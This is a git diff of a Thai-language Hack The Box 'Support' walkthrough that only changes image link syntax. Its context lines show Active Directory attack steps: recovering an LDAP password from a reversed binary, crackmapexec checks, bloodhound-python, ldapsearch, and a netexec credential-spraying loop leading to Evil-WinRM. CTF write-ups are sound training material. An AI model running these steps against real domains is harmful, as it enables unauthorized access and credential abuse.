@@ -43,7 +43,7 @@ Nmap done: 1 IP address (1 host up) scanned in 96.78 seconds
 
 ## Reverse UserInfo.exe using dnSpy 
 
-![[Challenge/HTB Challenge/Support/IMG/001.png]]
+![](./IMG/001.png)
 
 FOUND 
 ```
@@ -52,7 +52,7 @@ XOR_KEY_1=armando
 XOR_KEY_2=223 (ฐาน 10)
 ```
 
-![[Challenge/HTB Challenge/Support/IMG/003.png]]
+![](./IMG/003.png)
 
 
 ## Verify Credential 
@@ -61,7 +61,7 @@ XOR_KEY_2=223 (ฐาน 10)
 crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 ```
 
-![[Challenge/HTB Challenge/Support/IMG/004.png]]
+![](./IMG/004.png)
 
 จากตัวอย่างจะเห็นว่าสามารถใช้งาน รหัสที่ได้มาได้ และมี Username เป็น Support 
 
@@ -71,7 +71,7 @@ bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d su
 
 เราจะ SETUP โดยตั้งค่าเริ่มต้นเป็นผู้ใช้ support@support.htb โดยมีเป้าหมายไปที่ Domain Admin จะพบความเชื่อมโยงดังต่อไปนี้ 
 
-![[Challenge/HTB Challenge/Support/IMG/005.png]]
+![](./IMG/005.png)
 
 ## Ldap Search 
 
@@ -81,7 +81,7 @@ bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d su
 ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
 ```
 
-![[Challenge/HTB Challenge/Support/IMG/006.png]]
+![](./IMG/006.png)
 
 เราจะเห็นว่ามี Info: มีข้อมูลที่เหมือนจะเป็นรหัสผ่าน 
 
@@ -103,7 +103,7 @@ grep Ironside *
 for service in wmi winrm smb mssql rdp ssh ldap ftp vnc; do netexec $service support.htb -u 'support' -p 'Ironside47pleasure40Watchful'; done
 ```
 
-![[Challenge/HTB Challenge/Support/IMG/007.png]]
+![](./IMG/007.png)
 
 จากตัวอย่างจะเห็นว่าสามารถโจมตีด้วย WinRm ได้ ซึ่งสามารถใช้ Evil-WInRM ได้ 
 
